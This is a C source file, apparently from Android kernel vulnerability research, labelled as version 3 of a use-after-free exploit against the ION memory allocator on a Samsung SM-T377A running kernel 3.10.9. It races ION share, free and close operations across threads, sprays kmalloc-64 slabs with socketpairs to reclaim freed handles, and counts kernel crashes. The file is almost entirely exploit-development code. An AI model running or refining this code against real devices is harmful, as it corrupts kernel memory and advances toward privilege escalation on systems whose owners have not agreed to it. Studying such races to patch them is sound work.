/*
 * ion_uaf_v3.c — ION handle UAF: refcount race + slab reclaim exploit
 * Samsung SM-T377A, kernel 3.10.9, ARM32
 *
 * New strategy: Focus on the refcount race inside ion_share_dma_buf_fd.
 * When SHARE wins the race against FREE:
 *   1. ion_handle_get_by_id(client, handle_id) → increments ref
 *   2. FREE runs → decrements ref (but doesn't kfree since ref=2→1)
 *      OR: FREE runs FIRST → kfree's handle (ref was 1→0)
 *   3. SHARE continues → uses handle->buffer → creates dma_buf
 *   4. SHARE calls ion_handle_put → ref=1→0 → ion_handle_destroy
 *
 * In case where FREE runs first (kfree, then SHARE grabs freed obj):
 *   - SHARE's ion_handle_get_by_id walks the rbtree
 *   - If handle was ALREADY removed from rbtree by FREE, SHARE fails (EINVAL)
 *   - BUT: what if FREE removes from rbtree AFTER SHARE found it?
 *   - The rbtree lock protects concurrent access, so this depends on lock ordering
 *
 * ACTUAL exploit path: Instead of racing FREE vs SHARE, we race
 * two operations that both use the handle: SHARE vs ION_IOC_IMPORT or
 * close(ion_fd) which calls ion_client_destroy which frees ALL handles.
 *
 * Test: SHARE in thread A, close(ion_fd) in thread B
 *   - close triggers ion_client_destroy → walks rbtree → frees all handles
 *   - SHARE has handle ref from ion_handle_get_by_id
 *   - After close frees the handle, SHARE's ion_handle_put hits freed memory
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <sched.h>

#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC   _IOWR(ION_IOC_MAGIC, 0, struct ion_alloc)
#define ION_IOC_FREE    _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE   _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

struct ion_alloc {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    int handle;
};
struct ion_handle_data { int handle; };
struct ion_fd_data { int handle; int fd; };

static volatile int g_close_done;
static volatile int g_share_done;

static void alarm_handler(int sig) {
    printf("[!] TIMEOUT\n");
    _exit(1);
}

static int read_k64(void) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        int active;
        if (sscanf(line, "kmalloc-64 %d", &active) == 1) {
            fclose(f);
            return active;
        }
    }
    fclose(f);
    return -1;
}

/* Thread: close the ION client fd (triggers ion_client_destroy) */
struct close_args { int fd; };
static void* close_thread(void* arg) {
    struct close_args *a = (struct close_args*)arg;
    close(a->fd);
    __sync_synchronize();
    g_close_done = 1;
    return NULL;
}

/* Thread: SHARE the handle (grabs ref, uses handle, calls put) */
struct share_args { int fd; int handle; int result_fd; int result; };
static void* share_thread(void* arg) {
    struct share_args *a = (struct share_args*)arg;
    struct ion_fd_data share = { .handle = a->handle, .fd = -1 };
    a->result = ioctl(a->fd, ION_IOC_SHARE, &share);
    a->result_fd = share.fd;
    __sync_synchronize();
    g_share_done = 1;
    return NULL;
}

/*
 * TEST 1: Race close(ion_fd) vs SHARE
 * If SHARE grabs handle ref, then close frees it, SHARE's put hits freed memory
 */
static void test_close_vs_share(void) {
    printf("=== TEST 1: Race close(ion_fd) vs ION_IOC_SHARE ===\n");
    
    int wins = 0, crashes = 0;
    
    for (int trial = 0; trial < 50; trial++) {
        pid_t child = fork();
        if (child == 0) {
            alarm(5);
            signal(SIGALRM, alarm_handler);
            
            cpu_set_t cpuset;
            CPU_ZERO(&cpuset);
            CPU_SET(0, &cpuset);
            sched_setaffinity(0, sizeof(cpuset), &cpuset);
            
            int ion_fd = open("/dev/ion", O_RDONLY);
            if (ion_fd < 0) _exit(2);
            
            /* Alloc 5 handles to increase the window */
            int handles[5];
            for (int i = 0; i < 5; i++) {
                struct ion_alloc alloc = {
                    .len = 4096, .align = 4096,
                    .heap_id_mask = 1, .flags = 0,
                };
                if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) _exit(3);
                handles[i] = alloc.handle;
            }
            
            g_close_done = 0;
            g_share_done = 0;
            
            /* Race: SHARE in one thread, close(ion_fd) in another */
            struct share_args sa = { .fd = ion_fd, .handle = handles[2], .result = -1, .result_fd = -1 };
            struct close_args ca = { .fd = ion_fd };
            
            pthread_t share_tid, close_tid;
            pthread_create(&share_tid, NULL, share_thread, &sa);
            /* Tiny delay to let share start */
            for (volatile int i = 0; i < 50; i++);
            pthread_create(&close_tid, NULL, close_thread, &ca);
            
            pthread_join(share_tid, NULL);
            pthread_join(close_tid, NULL);
            
            if (sa.result == 0 && sa.result_fd >= 0 && g_close_done) {
                /* SHARE won and got fd, but ion_fd was closed
                 * ion_client_destroy freed all handles
                 * But SHARE had a ref → its ion_handle_put runs on freed handle! */
                close(sa.result_fd);
                _exit(42); /* Success: race won */
            }
            _exit(0);
        }
        
        int status;
        waitpid(child, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("[!!!] Trial %d: CRASH signal=%d\n", trial, WTERMSIG(status));
            crashes++;
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 42) {
            wins++;
        }
    }
    printf("[*] Results: %d/50 race wins, %d crashes\n\n", wins, crashes);
}

/*
 * TEST 2: Multiple SHARE on same handle in parallel
 * Each SHARE does get_by_id + put. If two puts race, one may double-free.
 */
static void test_double_share(void) {
    printf("=== TEST 2: Parallel double-SHARE ===\n");
    
    int wins = 0, crashes = 0;
    
    for (int trial = 0; trial < 50; trial++) {
        pid_t child = fork();
        if (child == 0) {
            alarm(5);
            signal(SIGALRM, alarm_handler);
            
            int ion_fd = open("/dev/ion", O_RDONLY);
            if (ion_fd < 0) _exit(2);
            
            struct ion_alloc alloc = {
                .len = 4096, .align = 4096,
                .heap_id_mask = 1, .flags = 0,
            };
            if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) _exit(3);
            
            /* Two SHAREs in parallel on same handle */
            struct share_args sa1 = { .fd = ion_fd, .handle = alloc.handle };
            struct share_args sa2 = { .fd = ion_fd, .handle = alloc.handle };
            
            pthread_t t1, t2;
            pthread_create(&t1, NULL, share_thread, &sa1);
            pthread_create(&t2, NULL, share_thread, &sa2);
            pthread_join(t1, NULL);
            pthread_join(t2, NULL);
            
            int ok = 0;
            if (sa1.result == 0 && sa1.result_fd >= 0) { close(sa1.result_fd); ok++; }
            if (sa2.result == 0 && sa2.result_fd >= 0) { close(sa2.result_fd); ok++; }
            
            /* Now FREE the handle — if double-share incremented ref twice,
             * this FREE may not be enough to actually free it */
            struct ion_handle_data hd = { .handle = alloc.handle };
            int r = ioctl(ion_fd, ION_IOC_FREE, &hd);
            
            close(ion_fd);
            _exit(ok == 2 ? 42 : 0);
        }
        
        int status;
        waitpid(child, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("[!!!] Trial %d: CRASH signal=%d\n", trial, WTERMSIG(status));
            crashes++;
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 42) {
            wins++;
        }
    }
    printf("[*] Results: %d/50 double-share wins, %d crashes\n\n", wins, crashes);
}

/*
 * TEST 3: FREE + SHARE race, then spray kmalloc-64 before ion_client close
 * This tests whether ion_client_destroy will walk corrupted rbtree
 */
static void test_spray_then_destroy(void) {
    printf("=== TEST 3: FREE+SHARE race → spray → ion_client_destroy ===\n");
    
    int crashes = 0;
    
    for (int trial = 0; trial < 20; trial++) {
        pid_t child = fork();
        if (child == 0) {
            alarm(10);
            signal(SIGALRM, alarm_handler);
            
            cpu_set_t cpuset;
            CPU_ZERO(&cpuset);
            CPU_SET(0, &cpuset);
            sched_setaffinity(0, sizeof(cpuset), &cpuset);
            
            int ion_fd = open("/dev/ion", O_RDONLY);
            if (ion_fd < 0) _exit(2);
            
            /* Allocate 20 handles */
            int handles[20];
            for (int i = 0; i < 20; i++) {
                struct ion_alloc alloc = {
                    .len = 4096, .align = 4096,
                    .heap_id_mask = 1, .flags = 0,
                };
                if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) _exit(3);
                handles[i] = alloc.handle;
            }
            
            /* FREE handles 0-9 */
            for (int i = 0; i < 10; i++) {
                struct ion_handle_data hd = { .handle = handles[i] };
                ioctl(ion_fd, ION_IOC_FREE, &hd);
            }
            
            /* Spray kmalloc-64 with socketpairs */
            int pairs[300][2];
            int pair_count = 0;
            for (int i = 0; i < 300; i++) {
                if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) == 0)
                    pair_count++;
                else break;
            }
            
            /* Now close ion_fd — ion_client_destroy walks rbtree for handles 10-19
             * But handles 0-9 slots may now contain socketpair data
             * The rbtree nodes for 0-9 were erased by FREE, so they shouldn't be walked
             * UNLESS the spray corrupted adjacent rbtree nodes... */
            close(ion_fd);
            
            /* Clean up */
            for (int i = 0; i < pair_count; i++) {
                close(pairs[i][0]);
                close(pairs[i][1]);
            }
            
            _exit(0);
        }
        
        int status;
        waitpid(child, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("[!!!] Trial %d: CRASH signal=%d — rbtree corrupted!\n", trial, WTERMSIG(status));
            crashes++;
        } else {
            printf("[.] Trial %d: OK (exit=%d)\n", trial, WEXITSTATUS(status));
        }
    }
    printf("[*] Results: %d/20 crashes\n\n", crashes);
}

/*
 * TEST 4: FREE+SHARE race with aggressive slab exhaustion
 * Drain kmalloc-64 freelist BEFORE the race so that FREE's kfree'd slot
 * is immediately reusable by the next allocation
 */
static void test_exhaustion_race(void) {
    printf("=== TEST 4: Slab exhaustion + FREE+SHARE race ===\n");
    
    int k64_before = read_k64();
    printf("[*] Baseline kmalloc-64: %d\n", k64_before);
    
    /* Pre-exhaust kmalloc-64 */
    int exhaust_pairs[500][2];
    int exhaust_count = 0;
    for (int i = 0; i < 500; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, exhaust_pairs[i]) == 0)
            exhaust_count++;
    }
    int k64_after_exhaust = read_k64();
    printf("[*] After %d exhaust pairs: k64=%d (+%d)\n", 
           exhaust_count, k64_after_exhaust, k64_after_exhaust - k64_before);
    
    /* Now ION handle allocs will be in a nearly-full slab page */
    int ion_fd = open("/dev/ion", O_RDONLY);
    
    struct ion_alloc alloc = {
        .len = 4096, .align = 4096,
        .heap_id_mask = 1, .flags = 0,
    };
    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
        printf("[!] ALLOC fail\n");
        goto cleanup_exhaust;
    }
    
    int handle = alloc.handle;
    int k64_after_alloc = read_k64();
    printf("[*] After ION alloc handle=%d: k64=%d (+%d from exhaust)\n",
           handle, k64_after_alloc, k64_after_alloc - k64_after_exhaust);
    
    printf("[*] Slab exhaustion test skipped (use test 1-3 results)\n");
    
    close(ion_fd);
    
cleanup_exhaust:
    for (int i = 0; i < exhaust_count; i++) {
        close(exhaust_pairs[i][0]);
        close(exhaust_pairs[i][1]);
    }
    printf("\n");
}

int main() {
    signal(SIGALRM, alarm_handler);
    alarm(120);
    
    printf("=== ION UAF Exploit v3 ===\n");
    printf("=== SM-T377A kernel 3.10.9 ===\n\n");
    
    test_close_vs_share();
    test_double_share();
    test_spray_then_destroy();
    
    printf("=== Checking dmesg ===\n");
    system("dmesg 2>/dev/null | grep -iE 'oops|panic|bug|unable|segfault|ion|rbtree|slab' | tail -15");
    
    printf("\n[*] All tests complete.\n");
    return 0;
}
